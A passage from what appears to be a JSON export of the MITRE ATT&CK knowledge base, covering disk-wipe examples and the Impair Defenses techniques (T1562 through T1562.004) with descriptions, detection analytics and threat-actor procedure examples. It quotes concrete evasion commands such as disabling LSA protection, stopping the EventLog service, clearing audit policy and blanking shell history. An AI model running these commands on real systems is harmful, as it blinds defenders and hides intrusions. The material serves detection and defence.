      "BFG Agonizerretrieves a device handle to\\\\.\\PhysicalDrive0to wipe the boot sector of a given disk.[10]",
      "CaddyWiperhas the ability to destroy information about a physical drive's partitions including the MBR, GPT, and partition entries.[11][12]",
      "DEADWOODopens and writes zeroes to the first 512 bytes of each drive, deleting the MBR.DEADWOODthen sends the control codeIOCTL_DISK_DELETE_DRIVE_LAYOUTto ensure the MBR is removed from the drive.[13]",
      "Ember Bearconducted destructive operations against victims, including disk structure wiping, via theWhisperGatemalware in Ukraine.[14]",
      "HermeticWiperhas the ability to corrupt disk partitions, damage the Master Boot Record (MBR), and overwrite the Master File Table (MFT) of all available physical drives.[15][16][17][18]",
      "DuringHomeLand Justice, threat actors used a version ofZeroCleareto wipe disk drives on targeted hosts.[19][20]",
      "KillDiskoverwrites the first sector of the Master Boot Record with \"0x00\".[21]",
      "Lazarus Groupmalware SHARPKNOT overwrites and deletes the Master Boot Record (MBR) on the victim's machine and has possessed MBR wiper malware since at least 2009.[22][23]",
      "MultiLayer Wiperopens a handle to\\\\\\\\.\\\\PhysicalDrive0and wipes the first 512 bytes of data from this location, removing the boot sector.[10]",
      "RawDiskwas used inShamoonto help overwrite components of disk structure like the MBR and disk partitions.[3][5]",
      "Sandworm Teamhas used theBlackEnergyKillDisk component to corrupt the infected system's master boot record.[24][25]",
      "Shamoonhas been seen overwriting features of disk structure such as the MBR.[1][2][3][5]",
      "StoneDrillcan wipe the master boot record of an infected computer.[26]",
      "WhisperGatecan overwrite the Master Book Record (MBR) on victim systems with a malicious 16-bit bootloader.[27][28][29][30][31][32]",
      "ZeroClearecan corrupt the file system and wipe the system drive on targeted hosts.[33][19][34]"
    ]
  },
  "T1562": {
    "Name": "Impair Defenses",
    "Description": "Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.Adversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out, preventing a system from shutting down, or disabling or modifying the update process. Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components. These restrictions can further enable malicious operations as well as the continued propagation of incidents.[1][2]",
    "Detects": [
      "Monitor logs for API calls to disable logging. In AWS, monitor for:StopLoggingandDeleteTrail.[9]In GCP, monitor for:google.logging.v2.ConfigServiceV2.UpdateSink.[10]In Azure, monitor foraz monitor diagnostic-settings delete.[11]Additionally, a sudden loss of a log source may indicate that it has been disabled.",
      "Monitor changes made to cloud services for unexpected modifications to settings and/or data.",
      "Monitor executed commands and arguments that may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms.",
      "Monitor for unusual/suspicious driver activity, especially regarding EDR and drivers associated with security tools as well as those that may be abused to disable security products.",
      "Monitor for missing log files hosts and services with known active periods.",
      "Monitor changes made to configuration files that contain settings for logging and defensive tools.",
      "Monitor for changes in the status of the system firewall such as Windows Security Auditing events 5025 (The Windows firewall service has been stopped) and 5034 (The Windows firewall driver was stopped).",
      "Monitor for changes made to firewall rules for unexpected modifications to allow/block specific network traffic that may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms.",
      "Monitor for the abnormal execution of API functions associated with system logging. For example, Bitlocker can be disabled by callingDisableKeyProtectorswithDisableCountto 0 for protected drives.[12]",
      "Monitor newly executed processes that may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms.",
      "Monitor contextual data about a running process, which may include information such as environment variables, image name, user/owner, or other information.",
      "Using another process or third-party tools, monitor for modifications or access to system processes associated with logging.",
      "Monitor for unexpected deletions of a running process (ex: Sysmon EID 5 or Windows EID 4689) that may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms.",
      "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.",
      "Monitor logging, messaging, and other artifacts highlighting the health of host sensors (ex: metrics, errors, and/or exceptions from logging applications) that may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. Lack of log events may be suspicious.",
      "Monitor contextual data about a service/daemon, which may include information such as name, service executable, start type that that may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms.",
      "Monitor for changes to account settings associated with users/tenants that may impact defensive logging capabilities, such as theUpdate UserandChange User Licenseevents in the Azure AD audit log.[13]",
      "Monitor for unexpected deletion of windows registry keys that that may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms.",
      "Monitor Registry edits for modifications to services and startup programs that correspond to security tools and settings. For example, HVCI (Hypervisor-Protected Code Integrity) can be disabled by modifying the registry keyHKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defenderto 0, allowing the system to run custom unsigned kernel code.[12][14]"
    ],
    "Procedure Examples": [
      "BlackByteremoved Kernel Notify Routines to bypass endpoint detection and response (EDR) products.[3]",
      "BOLDMOVEcan modify proprietary Fortinet logs on victim machines.[4]",
      "JumbledPathcan impair logging on all devices used along its connection path to compromised hosts.[5]",
      "Magic Houndhas disabled LSA protection on compromised hosts using\"reg\" add HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /t REG_DWORD /d 0 /f.[6]",
      "Stuxnetreduces the integrity level of objects to allow write actions.[7]"
    ]
  },
  "T1562.001": {
    "Name": "Impair Defenses:Disable or Modify Tools",
    "Description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.[1]Adversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar toIndicator Blocking, adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.[2][3]Alternatively, they may add new directories to an endpoint detection and response (EDR) tool’s exclusion list, enabling them to hide malicious files viaFile/Path Exclusions.[4][5]Adversaries may also focus on specific applications such as Sysmon. For example, the \"Start\" and \"Enable\" values inHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operationalmay be modified to tamper with and potentially disable Sysmon logging.[6]On network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.[7][8]In cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.Furthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.[9][10][11][12]For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.[11]Additionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e.Exploitation for Privilege Escalation), which may lead to bypassing anti-tampering features.[13]",
    "Detects": [
      "Monitor for the execution of commands and arguments associated with disabling or modification of security software processes or services such asSet-MpPreference-DisableScriptScanning 1in Windows,sudo spctl --master-disablein macOS, andsetenforce 0in Linux. Furthermore, on Windows monitor for the execution of taskkill.exe or Net Stop commands which may deactivate antivirus software and other security systems.",
      "Monitor for unusual/suspicious driver activity, especially regarding EDR and drivers associated with security tools as well as those that may be abused to disable security products.",
      "In an attempt to avoid detection after compromising a machine, threat actors often try to disable Windows Defender. This is often done using \"sc\" [service control], a legitimate tool provided by Microsoft for managing services. This action interferes with event detection and may lead to a security event going undetected, thereby potentially leading to further compromise of the network.Note: Though this analytic is utilizing Event ID 1 for process creation, the arguments are specifically looking for the use of service control for querying or trying to stop Windows Defender.Analytic 1 - Detecting Tampering of Windows Defender Command Prompt(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") Image=\"C:\\Windows\\System32\\sc.exe\" (CommandLine=\"scconfig\" OR CommandLine=\"scstop\" OR CommandLine=\"scquery\" )",
      "Monitor processes for unexpected termination related to security tools/services. Specifically, before execution of ransomware, monitor for rootkit tools, such as GMER, PowerTool or TDSSKiller, that may detect and terminate hidden processes and the host antivirus software.",
      "Lack of expected log events may be suspicious. Monitor for telemetry that provides context for modification or deletion of information related to security software processes or services such as Windows Defender definition files in Windows and System log files in Linux.",
      "Monitor for telemetry that provides context of security software services being disabled or modified. In cloud environments, monitor virtual machine logs for the status of cloud security agents. Spyware and malware remain a serious problem and Microsoft developed security services, Windows Defender and Windows Firewall, to combat this threat. In the event Windows Defender or Windows Firewall is turned off, administrators should correct the issue immediately to prevent the possibility of infection or further infection and investigate to determine if caused by crash or user manipulation.Note: Windows Event code 7036 from the System log identifies if a service has stopped or started. This analytic looks for \"Windows Defender\" or \"Windows Firewall\" that has stopped.Analytic 1 - User Activity from Stopping Windows Defensive Services(source=\"WinEventLog:System\" EventCode=\"7036\") ServiceName=\"Windows Defender\" OR ServiceName=\"Windows Firewall\" AND ServiceName=\"stopped*\"",
      "Monitor for deletion of Windows Registry keys and/or values related to services and startup programs that correspond to security tools such as HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers.",
      "Monitor for changes made to Windows Registry keys and/or values related to services and startup programs that correspond to security tools such as HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender."
    ],
    "Procedure Examples": [
      "During the2015 Ukraine Electric Power Attack,Sandworm Teammodified in-registry internet settings to lower internet security.[14]",
      "Agent Teslahas the capability to kill any running analysis processes and AV software.[15]",
      "Agriusused several mechanisms to try to disable security tools.Agriusattempted to modify EDR-related services to disable auto-start on system reboot.Agriusused a publicly available driver,GMER64.systypically used for anti-rootkit functionality, to selectively stop and remove security software processes.[16]",
      "Akirahas disabled or modified security tools for defense evasion.[17]",
      "APT38has unhooked DLLs to disable endpoint detection and response (EDR) or anti-virus (AV) tools.[18]",
      "Aquatic Pandahas attempted to stop endpoint detection and response (EDR) tools on compromised systems.[19]",
      "ArcaneDoormodified the Authentication, Authorization, and Accounting (AAA) function of targeted Cisco ASA appliances to allow the threat actor to bypass normal AAA operations.[20][21]",
      "Avaddonlooks for and attempts to stop anti-malware solutions.[22]",
      "Babukcan stop anti-virus services on a compromised host.[23]",
      "Bazarhas manually loaded ntdll from disk in order to identity and remove API hooks set by security products.[24]",
      "BlackBytedisabled security tools such as Windows Defender and the Raccine anti-ransomware tool during operations.[25][26][27]",
      "BlackByte Ransomwareadds .JS and .EXE extensions to the Microsoft Defender exclusion list.BlackByte Ransomwareterminates and removes the Raccine anti-ransomware utility.[28]",
      "Brave Princeterminates antimalware processes.[29]",
      "BRONZE BUTLERhas incorporated code into several tools that attempts to terminate anti-virus processes.[30]",
      "Bundlorecan change browser security settings to enable extensions to be installed.Bundloreuses thepkill cfprefsdcommand to prevent users from inspecting processes.[31][32]",
      "Carberphas attempted to disable security software by creating a suspended process for the security software and injecting code to delete antivirus core files when the process is resumed.[33]",
      "ChChescan alter the victim's proxy configuration.[34]",
      "Clopcan uninstall or disable security products.[35]",
      "Cobalt Strikehas the ability to use Smart Applet attacks to disable the Java SecurityManager sandbox.[36][37]",
      "Confickerterminates various services related to system security and Windows.[38]",
      "DuringCutting Edge, threat actors disabled logging and modified thecompcheckresult.cgicomponent to edit the Ivanti Connect Secure built-in Integrity Checker exclusion list to evade detection.[39][40]",
      "DarkCometcan disable Security Center functions like anti-virus.[41][42]",
      "DarkGatewill terminate processes associated with several security software products if identified during execution.[43]",
      "Diavolcan attempt to stop security software.[44]",
      "Donutcan patch Antimalware Scan Interface (AMSI), Windows Lockdown Policy (WLDP), as well as exit-relatedNative APIfunctions to avoid process termination.[45]",
      "Eburycan disable SELinux Role-Based Access Control and deactivate PAM modules.[46]",
      "Egregorhas disabled Windows Defender to evade protections.[47]",
      "EKANSstops processes related to security and management software.[48][49]",
      "Ember Bearuses the NirSoft AdvancedRun utility to disable Microsoft Defender Antivirus through stopping the WinDefend service on victim machines.Ember Beardisables Windows Defender via registry key changes.[50]",
      "FIN6has deployed a utility script namedkill.batto disable anti-virus.[51]",
      "Gamaredon Grouphas delivered macros which can tamper with Microsoft Office security settings.[52]",
      "Gold Dragonterminates anti-malware processes if they’re found running on the system.[29]",
      "Goopyhas the ability to disable Microsoft Outlook's security policies to disable macro warnings.[53]",
      "Gorgon Groupmalware can attempt to disable security features in Microsoft Office and Windows Defender using thetaskkillcommand.[54]",
      "Grandoreirocan hook APIs, kill processes, break file system paths, and change ACLs to prevent security tools from running.[55]",
      "H1N1kills and disables services for Windows Security Center, and Windows Defender.[56]",
      "HDoorkills anti-virus found on the victim.[57]",
      "Hildegardhas modified DNS resolvers to evade DNS monitoring tools.[58]",
      "DuringHomeLand Justice, threat actors modified and disabled components of endpoint detection and response (EDR) solutions including Microsoft Defender Antivirus.[59]",
      "Imminent Monitorhas a feature to disable Windows Task Manager.[60]",
      "INC Ransomcan use SystemSettingsAdminFlows.exe, a native Windows utility, to disable Windows Defender.[61]",
      "Indrik SpiderusedPsExecto leverage Windows Defender to disable scanning of all downloaded files and to restrict real-time monitoring.[62]Indrik Spiderhas usedMpCmdRunto revert the definitions in Microsoft Defender.[63]Additionally,Indrik Spiderhas used WMI to stop or uninstall and reset anti-virus products and other defensive services.[63]",
      "JPINcan lower security settings by changing Registry keys.[64]",
      "Kimsukyhas been observed turning off Windows Security Center and can hide the AV software window from the view of the infected user.[65][66]",
      "KOCTOPUSwill attempt to delete or disable all Registry keys and scheduled tasks related to Microsoft Security Defender and Security Essentials.[67]",
      "KV Botnet Activityused various scripts to remove or disable security tools, such ashttp_watchdogandfirewallsd, as well as tools related to other botnet infections, such asmips_ff, on victim devices.[68]",
      "Lazarus Groupmalware TangoDelta attempts to terminate various processes associated with McAfee. Additionally,Lazarus Groupmalware SHARPKNOT disables the Microsoft Windows System Event Notification and Alerter services.[69][70][71][72].",
      "LockBit 2.0can disable firewall rules and anti-malware and monitoring software including Windows Defender.[73][74]",
      "LockBit 3.0can disable security tools to evade detection including Windows Defender.[75][76][77]",
      "LockerGogainstallation has been immediately preceded by a \"task kill\" command in order to disable anti-virus.[78]",
      "Lumma Stealerhas attempted to bypass Windows Antimalware Scan Interface (AMSI) by removing the string \"AmsiScanBuffer\" from the \"clr.dll\" module in memory to prevent it from being called.[79]",
      "macOS.OSAMinerhas searched for the Activity Monitor process in the System Events process list and kills the process if running.macOS.OSAMineralso searches the operating system'sinstall.logfor apps matching its hardcoded list, killing all matching process names.[80]",
      "Magic Houndhas disabled antivirus services on targeted systems in order to upload malicious payloads.[81]",
      "Mangocontains an unused capability to block endpoint security solutions from loading user-mode code hooks via a DLL in a specified process by using theUpdateProcThreadAttribute APIto set thePROC_THREAD_ATTRIBUTE_MITIGATION_POLICYtoPROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ONfor an identified process.[82]",
      "Mazehas disabled dynamic analysis and other security tools including IDA debugger, x32dbg, and OllyDbg.[83]It has also disabled Windows Defender's Real-Time Monitoring feature and attempted to disable endpoint protection services.[84]",
      "MegaCortexwas used to kill endpoint security processes.[85]",
      "Metamorfohas a function to kill processes associated with defenses and can prevent certain processes from launching.[86][87]",
      "Meteorcan attempt to uninstall Kaspersky Antivirus or remove the Kaspersky license; it can also add all files and folders related to the attack to the Windows Defender exclusion list.[88]",
      "MuddyWatercan disable the system's local proxy settings.[89]",
      "MultiLayer Wiperremoves the Volume Shadow Copy (VSS) service from infected devices along with all present shadow copies.[16]",
      "NanHaiShucan change Internet Explorer settings to reduce warnings about malware activity.[90]",
      "NanoCorecan modify the victim's anti-virus.[91][92]",
      "Netwalkercan detect and terminate active security software-related processes on infected systems.[93][94]",
      "DuringNight Dragon, threat actors disabled anti-virus and anti-spyware tools in some instances on the victim’s machines. The actors also disabled proxy settings to allow direct communication from victims to the Internet.[95]",
      "Playhas used tools including GMER, IOBit, and PowerTool to disable antivirus software.[96][97]",
      "POWERSTATScan disable Microsoft Office Protected View by changing Registry keys.[98]",
      "Protonkills security tools like Wireshark that are running.[99]",
      "Malware used byPutter Pandaattempts to terminate processes corresponding to two components of Sophos Anti-Virus (SAVAdminService.exe and SavService.exe).[100]",
      "Pysahas the capability to stop antivirus services and disable Windows Defender.[101]",
      "QakBothas the ability to modify the Registry to add its binaries to the Windows Defender exclusion list.[102]",
      "Ragnar Lockerhas attempted to terminate/stop processes and services associated with endpoint security products.[103]",
      "Raspberry Robincan add an exception to Microsoft Defender that excludes the entire main drive from anti-malware scanning to evade detection.[104]",
      "REvilcan connect to and disable the Symantec server on the victim's network.[105]",
      "RobbinHoodwill search for Windows services that are associated with antivirus software on the system and kill the process.[106]",
      "Rockeused scripts which detected and uninstalled antivirus software.[107][108]",
      "RunningRATkills antimalware running process.[29]",
      "Ryukhas stopped services related to anti-virus.[109]",
      "Saint Bearwill modify registry entries and scheduled task objects associated with Windows Defender to disable its functionality.[110]",
      "ShrinkLockerdisables protectors used to secure the BitLocker encryption key on victim systems.[111][112]",
      "SILENTTRINITY'samsiPatch.pymodule can disable Antimalware Scan Interface (AMSI) functions.[113]",
      "Skidmaphas the ability to set SELinux to permissive mode.[114]",
      "During theSolarWinds Compromise,APT29used the service control manager on a remote system to disable services associated with security monitoring products.[115]",
      "SslMMidentifies and kills anti-malware processes.[57]",
      "StrongPitycan add directories used by the malware to the Windows Defender exclusions list to prevent detection.[116]",
      "SUNBURSTattempted to disable software security services following checks against a FNV-1a + XOR hashed hardcoded blocklist.[117]",
      "TA2541has attempted to disable built-in security protections such as Windows AMSI.[118]",
      "TA505has used malware to disable Windows Defender.[119]",
      "TeamTNThas disabled and uninstalled security tools such as Alibaba, Tencent, and BMC cloud monitoring agents on cloud-based infrastructure.[120][121]",
      "ThiefQuestuses the functionkill_unwantedto obtain a list of running processes and kills each process matching a list of security related processes.[122]",
      "TinyZBotcan disable Avira anti-virus.[123]",
      "TrickBotcan disable Windows Defender.[124]",
      "Turlahas used a AMSI bypass, which patches the in-memory amsi.dll, in PowerShell scripts to bypass Windows antimalware products.[125]",
      "Unknown Loggerhas functionality to disable security tools, including Kaspersky, BitDefender, and MalwareBytes.[126]",
      "Velvet Antattempted to disable local security tools and endpoint detection and response (EDR) software during operations.[127]",
      "WarzoneRATcan disarm Windows Defender during the UAC process to evade detection.[128]",
      "WhisperGatecan download and execute AdvancedRun.exe to disable the Windows Defender Theat Protection service and set an exclusion path for the C:\\ drive.[129][130][131]",
      "Wizard Spiderhas shut down or uninstalled security applications on victim systems that might prevent ransomware from executing.[132][133][134][135]",
      "XLoaderloads a copy of NTDLL to evade hooks from security monitoring tools on this library.[136]XLoadercan add the path of its executable to the Microsoft Defender exclusion list.[137]",
      "ZIPLINEcan add itself to the exclusion list for the Ivanti Connect Secure Integrity Checker Tool if the--excludeparameter is passed by thetarprocess.[138]",
      "ZxShellcan kill AV products' processes.[139]"
    ]
  },
  "T1562.002": {
    "Name": "Impair Defenses:Disable Windows Event Logging",
    "Description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.[1]This data is used by security tools and analysts to generate detections.The EventLog service maintains event logs from various system components and applications.[2]By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating toSecurity Settings\\Local Policies\\Audit Policyfor basic audit policy settings orSecurity Settings\\Advanced Audit Policy Configurationfor advanced audit policy settings.[3][4]auditpol.exemay also be used to set audit policies.[5]Adversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using theSet-Service -Name EventLog -Status Stoppedorsc config eventlog start=disabledcommands (followed by manually stopping the service usingStop-Service  -Name EventLog).[6][7]Additionally, the service may be disabled by modifying the \"Start\" value inHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLogthen restarting the system for the change to take effect.[7]There are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the keyHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security, then reboot the system to disable the Security EventLog.[8]Second, with Administrator privilege, adversaries may modify the same values inHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-SystemandHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Applicationto disable the entire EventLog.[7]Additionally, adversaries may useauditpoland its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the/successor/failureparameters. For example,auditpol /set /category:\"Account Logon\" /success:disable /failure:disableturns off auditing for the Account Logon category.[9][10]To clear the audit policy, adversaries may run the following lines:auditpol /clear /yorauditpol /remove /allusers.[10]By disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
    "Detects": [
      "Monitor for third-party application logging, messaging, and/or other artifacts provided by third-party services that may disable Windows event logging to limit data that can be leveraged for detections and audits.",
      "Monitor executed commands and arguments for commands that can be used to disable logging. For example,Wevtutil, auditpol,sc stop EventLog,reg add,Set- or Stop-Service,Set- or New-ItemProperty,sc config, and offensive tooling (such asMimikatzand Invoke-Phant0m) may be used to clear logs and/or change the EventLog/audit policy.[18][19][7]",
      "Monitor newly executed processes that may disable Windows event logging to limit data that can be leveraged for detections and audits.Analytic 1 - Disable Windows Event Logging(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\")     ((CommandLine=\"New-Item\" OR CommandLine=\"reg add\") CommandLine=\"MiniNt\")    OR     (CommandLine=\"Stop-Service\" CommandLine=\"EventLog\")    OR     (CommandLine=\"EventLog\" (CommandLine=\"Set-Service\" OR CommandLine=\"reg add\" OR CommandLine=\"Set-ItemProperty\" OR CommandLine=\"New-ItemProperty\" OR CommandLine=\"sc config\"))     OR     (CommandLine=\"auditpol\" (CommandLine=\"/set\" OR CommandLine=\"/clear\" OR CommandLine=\"/revove\"))     OR     (CommandLine=\"wevtutil\" (CommandLine=\"sl\" OR CommandLine=\"set-log\"))",
      "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.",
      "Monitor for logging, messaging that may disable Windows event logging to limit data that can be leveraged for detections and audits. For example, adversaries may modify the EventLog file path to a different file name and location.[7]",
      "Monitor the addition of the MiniNT registry key in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control, which may disable Event Viewer.[18][7]",
      "Monitor the addition of the MiniNT registry key in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control, which may disable Event Viewer.[18]Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. There are different ways to perform this attack.1. The first one is to create the Registry Key HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\MiniNt. This action will not generate Security EventLog 4657 or Sysmon EventLog 13 because the value of the key remains empty. However, if an attacker uses powershell to perform this attack (and not cmd), a Security EventLog 4663 will be generated (but 4663 generates a lot of noise).2. The second way is to disable the service EventLog (display name Windows Event Log). After disabed, attacker must reboot the system. The action of disabling or put in manual the service will modify the Registry Key value HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\start, therefore Security EventLog 4657 or Sysmon EventLog 13 will be generated on the system.3. The third way is linked with the second. By default, the EventLog service cannot be stopped. If an attacker tries to stop the service, this one will restart immediately. Why ? Because to stop completely, this service must stop others, one in particular called netprofm (display name Network List Service). This service remains running until it is disabled. So Attacker must either disable EventLog and after to stop it or disable netprofm and after stop EventLog. Only stopping the service (even as admin) will not have an effect on the EventLog service because of the link with netprofm. Security EventLog 1100 will log the stop of the EventLog service (but also generates a lot of noise because it will generate a log everytime the system shutdown).4. The fourth way is to use auditpol.exe to modify the audit configuration and disable/modify important parameters that will lead to disable the creation of EventLog.5. The last one is to modify the Registry Key value HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security\\file (or other kind of log) to modify the path where the EventLog are stocked. Importantly, with this technique, the EventViewer will use the value of the Registry Key \"file\" to know where to find the Log. Thus, using the EventViewer will always show the current event logs, but the old one will be stocked in another evtx. Also, the path must be in a folder that the Eventlog process has access (like it doesn’t work if attacker set up the new path in the Desktop). Attacker can also decrease the maxsize value of the Log to force the system to rewrite on the older EventLog (but the minimum cannot be less than 1028 KB). As the Registry key is modified, Security EventLog 4657 or Sysmon EventLog 13 will be generated on the system. All of these attacks required administrative right. Attacks number three, four and five do not require a system reboot to be effective immediately.Analytic 1 - Disable Windows Event Logging(source=\"WinEventLog:Security\" EventCode IN (4657, 4719) OR source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"13\")     (ObjectName=\"EventLog\")     (ObjectValueName=\"Start\" OR ObjectValueName=\"File\" OR ObjectValueName=\"MaxSize\")"
    ],
    "Procedure Examples": [
      "During the2016 Ukraine Electric Power Attack,Sandworm Teamdisabled event logging on compromised systems.[11]",
      "DuringHomeLand Justice, threat actors deleted Windows events and application logs.[12]",
      "Magic Houndhas executed scripts to disable the event log service.[13]",
      "During theSolarWinds Compromise,APT29, usedAUDITPOLto prevent the collection of audit logs.[14]",
      "Threat Group-3390has used appcmd.exe to disable logging on a victim server.[15]",
      "Wevtutilcan be used to disable specific event logs on the system.[16]"
    ]
  },
  "T1562.003": {
    "Name": "Impair Defenses:Impair Command History Logging",
    "Description": "Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.On Linux and macOS, command history is tracked in a file pointed to by the environment variableHISTFILE. When a user logs off a system, this information is flushed to a file in the user's home directory called~/.bash_history. TheHISTCONTROLenvironment variable keeps track of what should be saved by thehistorycommand and eventually into the~/.bash_historyfile when a user logs out.HISTCONTROLdoes not exist by default on macOS, but can be set by the user and will be respected. TheHISTFILEenvironment variable is also used in some ESXi systems.[1]Adversaries may clear the history environment variable (unset HISTFILE) or set the command history size to zero (export HISTFILESIZE=0) to prevent logging of commands. Additionally,HISTCONTROLcan be configured to ignore commands that start with a space by simply setting it to \"ignorespace\".HISTCONTROLcan also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \" ls\" will not be saved, but \"ls\" would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands.On Windows systems, thePSReadLinemodule tracks commands used in all PowerShell sessions and writes them to a file ($env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txtby default). Adversaries may change where these logs are saved usingSet-PSReadLineOption -HistorySavePath {File Path}. This will causeConsoleHost_history.txtto stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell commandSet-PSReadlineOption -HistorySaveStyle SaveNothing.[2][3][4]Adversaries may also leverage aNetwork Device CLIon network devices to disable historical command logging (e.g.no logging).",
    "Detects": [
      "Correlating a user session with a distinct lack of new commands in their.bash_historycan be a clue to suspicious behavior. Monitor for modification of PowerShell command history settings through processes being created with-HistorySaveStyle SaveNothingcommand-line arguments and use of the PowerShell commandsSet-PSReadlineOption -HistorySaveStyle SaveNothingandSet-PSReadLineOption -HistorySavePath {File Path}. For network devices, monitor for missing or inconsistencies in Network Device CLI logging present in AAA logs as well as in specific RADIUS and TACAS+ logs.",
      "Users checking or changing theirHISTCONTROL,HISTFILE, orHISTFILESIZEenvironment variables may be suspicious."
    ],
    "Procedure Examples": [
      "APT38has prepended a space to all of their terminal commands to operate without leaving traces in the HISTCONTROL environment.[5]",
      "ArcaneDoorincluded disabling logging on targeted Cisco ASA appliances.[6][7]",
      "BPFDoorsets theMYSQL_HISTFILEandHISTFILEto/dev/nullpreventing the shell and MySQL from logging history in/proc/<PID>/environ.[8]",
      "Line Dancercan disable syslog on compromised devices.[6]",
      "Sea Turtleunset the Bash and MySQL history files on victim systems.[9]",
      "SILENTTRINITYcan bypass ScriptBlock logging to execute unmanaged PowerShell code from memory.[10]"
    ]
  },
  "T1562.004": {
    "Name": "Impair Defenses:Disable or Modify System Firewall",
    "Description": "Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.Modifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e.Non-Standard Port).[1]Adversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds.[2]Settings related to enabling abuse of variousRemote Servicesmay also indirectly modify firewall rules.In ESXi, firewall rules may be modified directly via the esxcli command line interface (e.g., viaesxcli network firewall set) or via the vCenter user interface.[3][4]",
    "Detects": [
      "Monitor executed commands and arguments associated with disabling or the modification of system firewalls such asnetsh advfirewall firewall set rule group=\"file and printer sharing\" new enable=Yes,ufw disable, andufw logging off. On ESXi hosts, monitor for commands such asesxcli network firewall set –enabled=falseoresxcli network firewall ruleset set --ruleset-id=<rulename> --enabled=true.[3]",
      "Monitor for changes in the status of the system firewall such as Windows Security Auditing events 5025 (The Windows firewall service has been stopped) and 5034 (The Windows firewall driver was stopped).",
